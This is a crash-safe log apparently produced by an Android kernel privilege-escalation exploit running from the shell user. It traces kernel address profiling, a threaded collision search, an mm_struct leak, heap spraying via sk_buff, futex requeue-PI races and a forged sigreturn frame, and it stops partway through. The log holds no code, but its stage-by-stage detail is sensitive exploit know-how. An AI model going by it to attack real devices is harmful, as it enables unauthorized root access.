===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788947632.txt pid=12953 uid=2000
1788947632.867 12953 [+] preload starting pid=12953
1788947632.868 12953 [+] startup context pid=12953 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788947632.869 12953 [+] build config pid=12953 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788947632.869 12953 [+] p0 profile pid=12953 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788947632.870 12953 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788947632.871 12953 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=b4698ea6-f90a-4a5d-b09e-fa1fedc69899 (odd attempts: leaked page scratch, even attempts: this alias)
1788947636.830 12953 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788947639.998 12953 [*] pile-up verified: approx_time=1480
1788947639.998 12953 [*] start finding collisisons
1788947639.999 12953 [*] target    0000007a000170c8
1788947687.728 12953 [*] [  0] tested 7500000 candidates, scanning=0xffffff81a286da00
1788947687.730 12953 [*] [  2] tested 7400000 candidates, scanning=0xffffff919cf24740
1788947687.734 12953 [*] [  4] tested 8000000 candidates, scanning=0xffffffa1be6db480
1788947687.737 12953 [*] [  5] tested 7300000 candidates, scanning=0xffffffa9975db480
1788947687.730 12953 [*] [  6] tested 7100000 candidates, scanning=0xffffffb18c348f00
1788947687.733 12953 [*] [  1] tested 7000000 candidates, scanning=0xffffff89869fff80
1788947687.735 12953 [*] [  3] tested 7500000 candidates, scanning=0xffffff99a286da00
1788947687.736 12953 [*] [  0] tested 7600000 candidates, scanning=0xffffff81a81b6cc0
1788947687.736 12953 [*] [  7] tested 7100000 candidates, scanning=0xffffffb98c348f00
1788947687.737 12953 [*] [  2] tested 7500000 candidates, scanning=0xffffff91a286da00
1788947687.740 12953 [*] [  4] tested 8100000 candidates, scanning=0xffffffa1c4024740
1788947687.741 12953 [*] [  5] tested 7400000 candidates, scanning=0xffffffa99cf24740
1788947687.741 12953 [*] [  6] tested 7200000 candidates, scanning=0xffffffb191c921c0
1788947687.742 12953 [*] [  1] tested 7100000 candidates, scanning=0xffffff898c348f00
1788947687.743 12953 [*] [  3] tested 7600000 candidates, scanning=0xffffff99a81b6cc0
1788947687.744 12953 [*] [  0] tested 7700000 candidates, scanning=0xffffff81adafff80
1788947687.745 12953 [*] [  7] tested 7200000 candidates, scanning=0xffffffb991c921c0
1788947687.746 12953 [*] [  2] tested 7600000 candidates, scanning=0xffffff91a81b6cc0
1788947687.746 12953 [*] [  4] tested 8200000 candidates, scanning=0xffffffa1c996da00
1788947687.750 12953 [*] [  0] tested 7800000 candidates, scanning=0xffffff81b3448f00
1788947687.748 12953 [*] [  5] tested 7500000 candidates, scanning=0xffffffa9a286da00
1788947687.748 12953 [*] [  6] tested 7300000 candidates, scanning=0xffffffb1975db480
1788947687.753 12953 [*] [  0] tested 7900000 candidates, scanning=0xffffff81b8d921c0
1788947687.749 12953 [*] [  1] tested 7200000 candidates, scanning=0xffffff8991c921c0
1788947687.751 12953 [*] [  7] tested 7300000 candidates, scanning=0xffffffb9975db480
1788947687.751 12953 [*] [  3] tested 7700000 candidates, scanning=0xffffff99adafff80
1788947687.752 12953 [*] [  2] tested 7700000 candidates, scanning=0xffffff91adafff80
1788947687.752 12953 [*] [  4] tested 8300000 candidates, scanning=0xffffffa1cf2b6cc0
1788947687.755 12953 [*] [  5] tested 7600000 candidates, scanning=0xffffffa9a81b6cc0
1788947687.756 12953 [*] [  6] tested 7400000 candidates, scanning=0xffffffb19cf24740
1788947687.756 12953 [*] [  1] tested 7300000 candidates, scanning=0xffffff89975db480
1788947687.758 12953 [*] [  0] tested 8000000 candidates, scanning=0xffffff81be6db480
1788947687.760 12953 [*] [  3] tested 7800000 candidates, scanning=0xffffff99b3448f00
1788947687.760 12953 [*] [  4] tested 8400000 candidates, scanning=0xffffffa1d4bfff80
1788947687.758 12953 [*] [  7] tested 7400000 candidates, scanning=0xffffffb99cf24740
1788947687.759 12953 [*] [  2] tested 7800000 candidates, scanning=0xffffff91b3448f00
1788947687.761 12953 [*] [  6] tested 7500000 candidates, scanning=0xffffffb1a286da00
1788947687.761 12953 [*] [  1] tested 7400000 candidates, scanning=0xffffff899cf24740
1788947687.762 12953 [*] [  5] tested 7700000 candidates, scanning=0xffffffa9adafff80
1788947687.767 12953 [*] [  6] tested 7600000 candidates, scanning=0xffffffb1a81b6cc0
1788947687.762 12953 [*] [  0] tested 8100000 candidates, scanning=0xffffff81c4024740
1788947687.765 12953 [*] [  3] tested 7900000 candidates, scanning=0xffffff99b8d921c0
1788947687.765 12953 [*] [  4] tested 8500000 candidates, scanning=0xffffffa1da548f00
1788947687.769 12953 [*] [  2] tested 7900000 candidates, scanning=0xffffff91b8d921c0
1788947687.770 12953 [*] [  7] tested 7500000 candidates, scanning=0xffffffb9a286da00
1788947687.770 12953 [*] [  5] tested 7800000 candidates, scanning=0xffffffa9b3448f00
1788947687.773 12953 [*] [  3] tested 8000000 candidates, scanning=0xffffff99be6db480
1788947687.770 12953 [*] [  6] tested 7700000 candidates, scanning=0xffffffb1adafff80
1788947687.771 12953 [*] [  1] tested 7500000 candidates, scanning=0xffffff89a286da00
1788947687.773 12953 [*] [  0] tested 8200000 candidates, scanning=0xffffff81c996da00
1788947687.775 12953 [*] [  2] tested 8000000 candidates, scanning=0xffffff91be6db480
1788947687.776 12953 [*] [  5] tested 7900000 candidates, scanning=0xffffffa9b8d921c0
1788947687.778 12953 [*] [  4] tested 8600000 candidates, scanning=0xffffffa1dfe921c0
1788947687.779 12953 [*] [  7] tested 7600000 candidates, scanning=0xffffffb9a81b6cc0
1788947687.785 12953 [*] [  5] tested 8000000 candidates, scanning=0xffffffa9be6db480
1788947687.785 12953 [*] [  4] tested 8700000 candidates, scanning=0xffffffa1e57db480
1788947687.786 12953 [*] [  7] tested 7700000 candidates, scanning=0xffffffb9adafff80
1788947687.782 12953 [*] [  1] tested 7600000 candidates, scanning=0xffffff89a81b6cc0
1788947687.783 12953 [*] [  3] tested 8100000 candidates, scanning=0xffffff99c4024740
1788947687.783 12953 [*] [  0] tested 8300000 candidates, scanning=0xffffff81cf2b6cc0
1788947687.787 12953 [*] [  2] tested 8100000 candidates, scanning=0xffffff91c4024740
1788947687.787 12953 [*] [  6] tested 7800000 candidates, scanning=0xffffffb1b3448f00
1788947687.791 12953 [*] [  5] tested 8100000 candidates, scanning=0xffffffa9c4024740
1788947687.793 12953 [*] [  4] tested 8800000 candidates, scanning=0xffffffa1eb124740
1788947687.793 12953 [*] [  7] tested 7800000 candidates, scanning=0xffffffb9b3448f00
1788947687.796 12953 [*] [  1] tested 7700000 candidates, scanning=0xffffff89adafff80
1788947687.798 12953 [*] [  3] tested 8200000 candidates, scanning=0xffffff99c996da00
1788947687.811 12953 [*] [  7] tested 7900000 candidates, scanning=0xffffffb9b8d921c0
1788947687.800 12953 [*] [  0] tested 8400000 candidates, scanning=0xffffff81d4bfff80
1788947687.803 12953 [*] [  6] tested 7900000 candidates, scanning=0xffffffb1b8d921c0
1788947687.803 12953 [*] [  2] tested 8200000 candidates, scanning=0xffffff91c996da00
1788947687.803 12953 [*] [  4] tested 8900000 candidates, scanning=0xffffffa1f0a6da00
1788947687.805 12953 [*] [  5] tested 8200000 candidates, scanning=0xffffffa9c996da00
1788947687.811 12953 [*] [  1] tested 7800000 candidates, scanning=0xffffff89b3448f00
1788947687.812 12953 [*] [  3] tested 8300000 candidates, scanning=0xffffff99cf2b6cc0
1788947687.821 12953 [*] [  4] tested 9000000 candidates, scanning=0xffffffa1f63b6cc0
1788947687.822 12953 [*] [  5] tested 8300000 candidates, scanning=0xffffffa9cf2b6cc0
1788947687.815 12953 [*] [  0] tested 8500000 candidates, scanning=0xffffff81da548f00
1788947687.815 12953 [*] [  6] tested 8000000 candidates, scanning=0xffffffb1be6db480
1788947687.817 12953 [*] [  7] tested 8000000 candidates, scanning=0xffffffb9be6db480
1788947687.819 12953 [*] [  2] tested 8300000 candidates, scanning=0xffffff91cf2b6cc0
1788947687.830 12953 [*] [  6] tested 8100000 candidates, scanning=0xffffffb1c4024740
1788947687.823 12953 [*] [  1] tested 7900000 candidates, scanning=0xffffff89b8d921c0
1788947687.824 12953 [*] [  3] tested 8400000 candidates, scanning=0xffffff99d4bfff80
1788947687.825 12953 [*] [  5] tested 8400000 candidates, scanning=0xffffffa9d4bfff80
1788947687.827 12953 [*] [  0] tested 8600000 candidates, scanning=0xffffff81dfe921c0
1788947687.829 12953 [*] [  4] tested 9100000 candidates, scanning=0xffffffa1fbcfff80
1788947687.833 12953 [*] [  7] tested 8100000 candidates, scanning=0xffffffb9c4024740
1788947687.833 12953 [*] [  2] tested 8400000 candidates, scanning=0xffffff91d4bfff80
1788947687.840 12953 [*] [  0] tested 8700000 candidates, scanning=0xffffff81e57db480
1788947687.842 12953 [*] [  4] tested 9200000 candidates, scanning=0xffffffa201648f00
1788947687.842 12953 [*] [  7] tested 8200000 candidates, scanning=0xffffffb9c996da00
1788947687.835 12953 [*] [  6] tested 8200000 candidates, scanning=0xffffffb1c996da00
1788947687.837 12953 [*] [  3] tested 8500000 candidates, scanning=0xffffff99da548f00
1788947687.844 12953 [*] [  4] tested 9300000 candidates, scanning=0xffffffa206f921c0
1788947687.838 12953 [*] [  1] tested 8000000 candidates, scanning=0xffffff89be6db480
1788947687.838 12953 [*] [  5] tested 8500000 candidates, scanning=0xffffffa9da548f00
1788947687.848 12953 [*] [  4] tested 9400000 candidates, scanning=0xffffffa20c8db480
1788947687.849 12953 [*] [  6] tested 8300000 candidates, scanning=0xffffffb1cf2b6cc0
1788947687.845 12953 [*] [  7] tested 8300000 candidates, scanning=0xffffffb9cf2b6cc0
1788947687.845 12953 [*] [  3] tested 8600000 candidates, scanning=0xffffff99dfe921c0
1788947687.846 12953 [*] [  2] tested 8500000 candidates, scanning=0xffffff91da548f00
1788947687.846 12953 [*] [  0] tested 8800000 candidates, scanning=0xffffff81eb124740
1788947687.850 12953 [*] [  1] tested 8100000 candidates, scanning=0xffffff89c4024740
1788947687.850 12953 [*] [  5] tested 8600000 candidates, scanning=0xffffffa9dfe921c0
1788947687.857 12953 [*] [  3] tested 8700000 candidates, scanning=0xffffff99e57db480
1788947687.853 12953 [*] [  4] tested 9500000 candidates, scanning=0xffffffa212224740
1788947687.854 12953 [*] [  6] tested 8400000 candidates, scanning=0xffffffb1d4bfff80
1788947687.858 12953 [*] [  2] tested 8600000 candidates, scanning=0xffffff91dfe921c0
1788947687.864 12953 [*] [  4] tested 9600000 candidates, scanning=0xffffffa217b6da00
1788947687.859 12953 [*] [  1] tested 8200000 candidates, scanning=0xffffff89c996da00
1788947687.860 12953 [*] [  0] tested 8900000 candidates, scanning=0xffffff81f0a6da00
1788947687.860 12953 [*] [  5] tested 8700000 candidates, scanning=0xffffffa9e57db480
1788947687.867 12953 [*] [  2] tested 8700000 candidates, scanning=0xffffff91e57db480
1788947687.861 12953 [*] [  7] tested 8400000 candidates, scanning=0xffffffb9d4bfff80
1788947687.862 12953 [*] [  3] tested 8800000 candidates, scanning=0xffffff99eb124740
1788947687.866 12953 [*] [  6] tested 8500000 candidates, scanning=0xffffffb1da548f00
1788947687.866 12953 [*] [  4] tested 9700000 candidates, scanning=0xffffffa21d4b6cc0
1788947687.868 12953 [*] [  1] tested 8300000 candidates, scanning=0xffffff89cf2b6cc0
1788947687.869 12953 [*] [  0] tested 9000000 candidates, scanning=0xffffff81f63b6cc0
1788947687.870 12953 [*] [  5] tested 8800000 candidates, scanning=0xffffffa9eb124740
1788947687.873 12953 [*] [  7] tested 8500000 candidates, scanning=0xffffffb9da548f00
1788947687.873 12953 [*] [  3] tested 8900000 candidates, scanning=0xffffff99f0a6da00
1788947687.875 12953 [*] [  2] tested 8800000 candidates, scanning=0xffffff91eb124740
1788947687.876 12953 [*] [  6] tested 8600000 candidates, scanning=0xffffffb1dfe921c0
1788947687.876 12953 [*] [  4] tested 9800000 candidates, scanning=0xffffffa222dfff80
1788947687.878 12953 [*] [  5] tested 8900000 candidates, scanning=0xffffffa9f0a6da00
1788947687.879 12953 [*] [  0] tested 9100000 candidates, scanning=0xffffff81fbcfff80
1788947687.884 12953 [*] [  4] tested 9900000 candidates, scanning=0xffffffa228748f00
1788947687.885 12953 [*] [  5] tested 9000000 candidates, scanning=0xffffffa9f63b6cc0
1788947687.880 12953 [*] [  3] tested 9000000 candidates, scanning=0xffffff99f63b6cc0
1788947687.882 12953 [*] [  2] tested 8900000 candidates, scanning=0xffffff91f0a6da00
1788947687.889 12953 [*] [  0] tested 9200000 candidates, scanning=0xffffff8201648f00
1788947687.883 12953 [*] [  6] tested 8700000 candidates, scanning=0xffffffb1e57db480
1788947687.887 12953 [*] [  4] tested 10000000 candidates, scanning=0xffffffa22e0921c0
1788947687.888 12953 [*] [  7] tested 8600000 candidates, scanning=0xffffffb9dfe921c0
1788947687.888 12953 [*] [  5] tested 9100000 candidates, scanning=0xffffffa9fbcfff80
1788947687.889 12953 [*] [  1] tested 8400000 candidates, scanning=0xffffff89d4bfff80
1788947687.891 12953 [*] [  3] tested 9100000 candidates, scanning=0xffffff99fbcfff80
1788947687.897 12953 [*] [  7] tested 8700000 candidates, scanning=0xffffffb9e57db480
1788947687.892 12953 [*] [  2] tested 9000000 candidates, scanning=0xffffff91f63b6cc0
1788947687.893 12953 [*] [  6] tested 8800000 candidates, scanning=0xffffffb1eb124740
1788947687.894 12953 [*] [  0] tested 9300000 candidates, scanning=0xffffff8206f921c0
1788947687.902 12953 [*] [  7] tested 8800000 candidates, scanning=0xffffffb9eb124740
1788947687.902 12953 [*] [  2] tested 9100000 candidates, scanning=0xffffff91fbcfff80
1788947687.896 12953 [*] [  4] tested 10100000 candidates, scanning=0xffffffa2339db480
1788947687.906 12953 [*] [  7] tested 8900000 candidates, scanning=0xffffffb9f0a6da00
1788947687.907 12953 [*] [  2] tested 9200000 candidates, scanning=0xffffff9201648f00
1788947687.898 12953 [*] [  1] tested 8500000 candidates, scanning=0xffffff89da548f00
1788947687.899 12953 [*] [  3] tested 9200000 candidates, scanning=0xffffff9a01648f00
1788947687.904 12953 [*] [  0] tested 9400000 candidates, scanning=0xffffff820c8db480
1788947687.905 12953 [*] [  6] tested 8900000 candidates, scanning=0xffffffb1f0a6da00
1788947687.908 12953 [*] [  4] tested 10200000 candidates, scanning=0xffffffa239324740
1788947687.909 12953 [*] [  5] tested 9200000 candidates, scanning=0xffffffaa01648f00
1788947687.910 12953 [*] [  7] tested 9000000 candidates, scanning=0xffffffb9f63b6cc0
1788947687.911 12953 [*] [  2] tested 9300000 candidates, scanning=0xffffff9206f921c0
1788947687.911 12953 [*] [  1] tested 8600000 candidates, scanning=0xffffff89dfe921c0
1788947687.913 12953 [*] [  3] tested 9300000 candidates, scanning=0xffffff9a06f921c0
1788947687.915 12953 [*] [  6] tested 9000000 candidates, scanning=0xffffffb1f63b6cc0
1788947687.915 12953 [*] [  0] tested 9500000 candidates, scanning=0xffffff8212224740
1788947687.917 12953 [*] [  4] tested 10300000 candidates, scanning=0xffffffa23ec6da00
1788947687.918 12953 [*] [  5] tested 9300000 candidates, scanning=0xffffffaa06f921c0
1788947687.920 12953 [*] [  7] tested 9100000 candidates, scanning=0xffffffb9fbcfff80
1788947687.928 12953 [*] [  4] tested 10400000 candidates, scanning=0xffffffa2445b6cc0
1788947687.929 12953 [*] [  5] tested 9400000 candidates, scanning=0xffffffaa0c8db480
1788947687.921 12953 [*] [  2] tested 9400000 candidates, scanning=0xffffff920c8db480
1788947687.923 12953 [*] [  1] tested 8700000 candidates, scanning=0xffffff89e57db480
1788947687.925 12953 [*] [  3] tested 9400000 candidates, scanning=0xffffff9a0c8db480
1788947687.925 12953 [*] [  6] tested 9100000 candidates, scanning=0xffffffb1fbcfff80
1788947687.927 12953 [*] [  0] tested 9600000 candidates, scanning=0xffffff8217b6da00
1788947687.934 12953 [*] [  1] tested 8800000 candidates, scanning=0xffffff89eb124740
1788947687.931 12953 [*] [  4] tested 10500000 candidates, scanning=0xffffffa249efff80
1788947687.935 12953 [*] [  0] thread done, tested 9605255 candidates
1788947687.932 12953 [*] [  5] tested 9500000 candidates, scanning=0xffffffaa12224740
1788947687.933 12953 [*] [  2] tested 9500000 candidates, scanning=0xffffff9212224740
1788947687.935 12953 [*] [  6] thread done, tested 9127210 candidates
1788947687.938 12953 [*] [  2] thread done, tested 9500000 candidates
1788947687.935 12953 [*] [  7] thread done, tested 9122872 candidates
1788947687.935 12953 [*] [  1] thread done, tested 8800000 candidates
1788947687.935 12953 [*] [  3] thread done, tested 9490975 candidates
1788947687.936 12953 [*] [  4] thread done, tested 10500000 candidates
1788947687.937 12953 [*] [  5] thread done, tested 9500000 candidates
1788947687.942 12953 [*] prepare_kernel_page leaked_mm=ffffff821801f080 base=ffffff8218018000 mode=0
1788947687.943 12953 [*] fake payload mode=0 write_shape=0 lock=ffffff82180184d0 w0=ffffff82180193a0 task=ffffff821801a380 write_parent=ffffff8218018180 write_right=0000000000000000 write_left=ffffff821801a180
1788947687.947 12953 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
1788947687.949 12953 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
1788947687.950 12953 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
1788947687.952 12953 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
1788947687.965 12953 [*] done
1788947691.004 12953 [+] heap_spray: page_base=ffffff8218018000 (leaked mm_struct)
1788947691.007 12953 [+] ckpt: route enter
1788947691.008 12953 [+] ckpt: route threads spawned
1788947691.012 12953 [+] ckpt: route ready waiter_waiting=1 owner_started=1
1788947691.115 12953 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
1788947699.011 12953 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=19368 sigalrm=0 setprio=0/0
1788947699.015 12953 [+] ckpt: do_sigret enter page=ffffff8218018000 lock=ffffff82180184d0 fops=ffffff8218018180
1788947699.016 12953 [+] ckpt: sigframe ready sf=0x79fe769db0 reserved=0x79fe76a000 align16=1
1788947699.017 12953 [+] ckpt: sigret attempt=1 page=ffffff8218018000 lock=ffffff82180184d0 tree_pc=ffffff8218018180 tree_left=ffffff821801a180 task=ffffff8042aec240 (silent prctl then rt_sigreturn+hold)
